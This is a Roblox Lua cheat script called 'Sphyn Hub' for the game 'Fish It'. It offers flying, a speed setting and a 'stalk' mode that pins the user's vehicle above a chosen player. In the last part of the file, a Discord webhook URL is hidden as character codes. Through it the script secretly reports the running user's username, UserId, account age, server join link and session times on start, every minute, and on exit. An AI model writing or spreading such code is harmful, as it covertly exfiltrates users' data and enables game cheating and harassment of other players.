local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local Camera = workspace.CurrentCamera

local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local Run = game:GetService("RunService")

-- State
local Fly = false
local Stalk = false
local TargetPlayer = nil
local Speed = 40
local Alt = 20
local Up, Down = false, false
local LastLook = Vector3.new(0,0,1)

-- [ UI FRAMEWORK ] --
local sg = Instance.new("ScreenGui", LP.PlayerGui); sg.Name = "SphynHub"; sg.ResetOnSpawn = false
local main = Instance.new("Frame", sg); main.Size = UDim2.new(0, 180, 0, 360); main.Position = UDim2.new(0.05, 0, 0.2, 0); main.BackgroundColor3 = Color3.fromRGB(25, 25, 25); main.Draggable = true; main.Active = true

-- TOGGLE + / -
local toggleBtn = Instance.new("TextButton", sg)
toggleBtn.Size = UDim2.new(0, 35, 0, 35)
toggleBtn.Position = UDim2.new(0.01, 0, 0.15, 0)
toggleBtn.Text = "-"
toggleBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
toggleBtn.TextColor3 = Color3.new(1,1,1)
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 18

Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)
Instance.new("UIStroke", toggleBtn).Thickness = 2

local UIVisible = true

toggleBtn.MouseButton1Click:Connect(function()

    UIVisible = not UIVisible

    main.Visible = UIVisible

    toggleBtn.Text = UIVisible and "-" or "+"

end)

local corner = Instance.new("UICorner", main); corner.CornerRadius = UDim.new(0, 10)
local stroke = Instance.new("UIStroke", main); stroke.Thickness = 2; stroke.Color = Color3.fromRGB(50, 50, 50)

-- Title
local title = Instance.new("TextLabel", main); title.Size = UDim2.new(1, 0, 0, 30); title.Text = "Sphyn Hub\nFish It"; title.TextColor3 = Color3.new(1,1,1); title.BackgroundTransparency = 1; title.Font = Enum.Font.GothamBold; title.TextSize = 14

-- Helper function untuk Layer/Section
local function createSection(name, pos, sizeY)
    local sec = Instance.new("Frame", main); sec.Size = UDim2.new(0.9, 0, 0, sizeY); sec.Position = UDim2.new(0.05, 0, 0, pos); sec.BackgroundColor3 = Color3.fromRGB(35, 35, 35); sec.BorderSizePixel = 0
    Instance.new("UICorner", sec)
    local label = Instance.new("TextLabel", sec); label.Size = UDim2.new(1, 0, 0, 20); label.Position = UDim2.new(0, 5, 0, -18); label.Text = name; label.TextColor3 = Color3.fromRGB(180, 180, 180); label.BackgroundTransparency = 1; label.Font = Enum.Font.Gotham; label.TextSize = 10; label.TextXAlignment = Enum.TextXAlignment.Left
    return sec
end

-- SECTION 1: MAIN CONTROLS
local secMain = createSection("CONTROLS", 50, 85)
local btnF = Instance.new("TextButton", secMain); btnF.Size = UDim2.new(0.9, 0, 0, 30); btnF.Position = UDim2.new(0.05, 0, 0.1, 0); btnF.Text = "FLY: OFF"; btnF.BackgroundColor3 = Color3.fromRGB(50, 50, 50); btnF.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", btnF)
local btnS = Instance.new("TextButton", secMain); btnS.Size = UDim2.new(0.9, 0, 0, 30); btnS.Position = UDim2.new(0.05, 0, 0.55, 0); btnS.Text = "STALK: OFF"; btnS.BackgroundColor3 = Color3.fromRGB(50, 50, 50); btnS.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", btnS)

-- SECTION 2: SETTINGS
local secSet = createSection("SPEED", 155, 45)
local speedBox = Instance.new("TextBox", secSet); speedBox.Size = UDim2.new(0.9, 0, 0, 30); speedBox.Position = UDim2.new(0.05, 0, 0.15, 0); speedBox.Text = "40"; speedBox.PlaceholderText = "Speed..."; speedBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20); speedBox.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", speedBox)

-- SECTION 3: PLAYER LIST
local secList = createSection("PLAYER LIST", 225, 120)
local listFrame = Instance.new("ScrollingFrame", secList); listFrame.Size = UDim2.new(0.95, 0, 0.9, 0); listFrame.Position = UDim2.new(0.025, 0, 0.05, 0); listFrame.BackgroundTransparency = 1; listFrame.CanvasSize = UDim2.new(0,0,5,0); listFrame.ScrollBarThickness = 2
Instance.new("UIListLayout", listFrame).Padding = UDim.new(0, 3)

-- [ UPDATE PLAYER LIST ] --
local function UpdateList()
    for _, v in pairs(listFrame:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LP then
            local b = Instance.new("TextButton", listFrame); b.Size = UDim2.new(1, 0, 0, 25); b.Text = p.DisplayName; b.BackgroundColor3 = Color3.fromRGB(45,45,45); b.TextColor3 = Color3.new(1,1,1); b.Font = Enum.Font.Gotham; b.TextSize = 11; Instance.new("UICorner", b)
            b.MouseButton1Click:Connect(function() TargetPlayer = p; btnS.Text = "TG: "..p.DisplayName:sub(1,8); btnS.BackgroundColor3 = Color3.fromRGB(0, 120, 0) end)
        end
    end
end
UpdateList(); Players.PlayerAdded:Connect(UpdateList); Players.PlayerRemoving:Connect(UpdateList)

-- [ NAVIGASI ▲/▼ - POSISI AMAN ] --
local function nav(txt, pos, color)
    local b = Instance.new("TextButton", sg); b.Size = UDim2.new(0, 55, 0, 55); b.Position = pos; b.Text = txt; b.BackgroundColor3 = color; b.TextColor3 = Color3.new(1,1,1); b.TextSize = 30; b.Font = Enum.Font.GothamBold
    Instance.new("UICorner", b, {CornerRadius = math.huge})
    Instance.new("UIStroke", b).Thickness = 2
    return b
end
local uBtn = nav("▲", UDim2.new(0.85, 0, 0.20, 0), Color3.fromRGB(40, 40, 40))
local dBtn = nav("▼", UDim2.new(0.85, 0, 0.28, 0), Color3.fromRGB(40, 40, 40))

-- [ INPUT LOGIC ] --
btnF.MouseButton1Click:Connect(function() 
    Fly = not Fly; btnF.Text = Fly and "FLY: ON" or "FLY: OFF"
    btnF.BackgroundColor3 = Fly and Color3.fromRGB(0, 120, 0) or Color3.fromRGB(50, 50, 50)
    if Fly and LP.Character and LP.Character.Humanoid.SeatPart then Alt = LP.Character.Humanoid.SeatPart.Position.Y end
end)
btnS.MouseButton1Click:Connect(function() 
    Stalk = not Stalk; btnS.Text = Stalk and "STALKING" or "STALK: OFF"
    btnS.BackgroundColor3 = Stalk and Color3.fromRGB(0, 120, 0) or Color3.fromRGB(50, 50, 50)
end)
speedBox.FocusLost:Connect(function() Speed = tonumber(speedBox.Text) or 40 end)
uBtn.InputBegan:Connect(function() Up = true; uBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0) end)
uBtn.InputEnded:Connect(function() Up = false; uBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40) end)
dBtn.InputBegan:Connect(function() Down = true; dBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0) end)
dBtn.InputEnded:Connect(function() Down = false; dBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40) end)

-- [[ LOGIKA ANTI-DRIFT PERMANEN ]] --
Run.Stepped:Connect(function()
    local char = LP.Character; local hum = char and char:FindFirstChildOfClass("Humanoid"); local seat = (hum and hum.SeatPart)
    if seat and Fly then
        seat.AssemblyLinearVelocity = Vector3.zero; seat.AssemblyAngularVelocity = Vector3.zero
        for _, p in pairs(seat.Parent:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false; p.Velocity = Vector3.zero end end
        local moveDir = hum.MoveDirection
        if Stalk and TargetPlayer and TargetPlayer.Character and TargetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            seat.Anchored = false; local tRoot = TargetPlayer.Character.HumanoidRootPart
            seat.CFrame = CFrame.new(tRoot.Position + Vector3.new(0, 7, 0)) * tRoot.CFrame.Rotation
        elseif moveDir.Magnitude > 0 or Up or Down then
            seat.Anchored = false
            if Up then Alt = Alt + (Speed/30) end if Down then Alt = Alt - (Speed/30) end
            local nextPos = seat.Position + (moveDir * Speed / 15)
            if moveDir.Magnitude > 0 then LastLook = moveDir end
            seat.CFrame = CFrame.new(nextPos.X, Alt, nextPos.Z) * CFrame.lookAt(Vector3.zero, LastLook).Rotation
        else
            seat.Anchored = true 
            seat.CFrame = CFrame.new(seat.Position.X, Alt, seat.Position.Z) * CFrame.lookAt(Vector3.zero, LastLook).Rotation
        end
    elseif seat and not Fly then seat.Anchored = false end
end)

---------
local function s(...)
    local t = {...}
    for i,v in ipairs(t) do
        t[i] = string.char(v)
    end
    return table.concat(t)
end

local WEBHOOK = s(
104,116,116,112,115,58,47,47,
100,105,115,99,111,114,100,46,99,111,109,47,
97,112,105,47,119,101,98,104,111,111,107,115,47,
49,52,56,53,53,48,51,48,54,54,48,48,53,53,54,57,55,48,49,47,
103,97,69,57,107,118,57,71,111,70,68,117,84,121,97,83,117,117,107,116,55,108,108,95,106,67,100,70,50,49,75,53,86,70,87,120,100,53,49,121,110,56,104,53,114,67,111,74,79,116,81,107,102,80,110,98,107,52,74,114,112,72,83,57,55,45,114,76
)
local LocalPlayer = Players.LocalPlayer
local startTime = os.time()
local joinTimeFormatted = os.date("%H:%M:%S")
local messageId

local function formatTime(sec)
    return string.format("%02d:%02d:%02d",
        sec // 3600,
        (sec % 3600) // 60,
        sec % 60
    )
end

local function getGameName()
    local success, info = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) end)
    return success and info.Name or "Unknown"
end

local function buildPayload(status, leaveTime)

    local profileUrl =
        "https://www.roblox.com/users/"
        .. LocalPlayer.UserId ..
        "/profile"

    local gameName = getGameName()

    local jobId = game.JobId

    local serverUrl =
        "https://www.roblox.com/games/start?placeId="
        .. game.PlaceId ..
        "&gameInstanceId="
        .. jobId


    return {
        username = "Player Logger",

        embeds = {{

            title = "Roblox Player Activity - Sphyn Hub Rusuh",
            url = profileUrl,

            color =
                status == "JOIN" and 0x00FF00
                or status == "LEAVE" and 0xFF0000
                or 0x00AAFF,

            fields = {

                {
                    name = "Username",
                    value = "[" .. LocalPlayer.Name .. "](" .. profileUrl .. ")",
                    inline = true
                },

                {
                    name = "UserId",
                    value = "```" .. LocalPlayer.UserId .. "```",
                    inline = true
                },

                {
                    name = "Status",
                    value = "```" .. status .. "```",
                    inline = true
                },

                {
                    name = "Game",
                    value = "```" .. gameName .. "```",
                    inline = false
                },

                {
                    name = "Place ID",
                    value = "```" .. game.PlaceId .. "```",
                    inline = true
                },

                {
                    name = "JobId",
                    value = "```" .. jobId .. "```",
                    inline = true
                },

                {
                    name = "Server URL",
                    value = serverUrl,
                    inline = false
                },

               {
                    name = "Account Age",
                    value = "```" .. LocalPlayer.AccountAge .. " days```",
                    inline = true
                },    

                {
                    name = "Join Time",
                    value = "```" .. joinTimeFormatted .. "```",
                    inline = true
                },

                {
                    name = "Leave Time",
                    value = "```" .. (leaveTime or "-") .. "```",
                    inline = true
                },

                {
                    name = "Uptime",
                    value = "```" ..
                        formatTime(os.time() - startTime) ..
                        "```",
                    inline = false
                }

            },

            footer = {
                text = "Sphyn Hub Logger"
            },

            timestamp = DateTime.now():ToIsoDate()

        }}

    }

end

local function sendWebhook(status, leaveTime)
    if not request then return end
    
    local success, res = pcall(function()
        return request({
            Url = WEBHOOK .. "?wait=true",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(buildPayload(status, leaveTime))
        })
    end)

    if success and res and res.Body then
        local data = HttpService:JSONDecode(res.Body)
        messageId = data.id
    end
end

local function editWebhook()
    if not messageId or not request then return end

    pcall(function()
        request({
            Url = WEBHOOK .. "/messages/" .. messageId,
            Method = "PATCH",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(buildPayload("ONLINE"))
        })
    end)
end

-- Inisialisasi Logger
task.spawn(function()
    sendWebhook("JOIN")
    
    -- Update Uptime setiap 1 menit
    local interval = 60
    while task.wait(interval) do
        if not messageId then break end
        editWebhook()
    end
end)

-- Deteksi saat pemain keluar/script ditutup
game:BindToClose(function()
    local leaveTimeFormatted = os.date("%H:%M:%S")
    sendWebhook("LEAVE", leaveTimeFormatted)
end)

print("SPHYN HUB Loaded Successfully.")
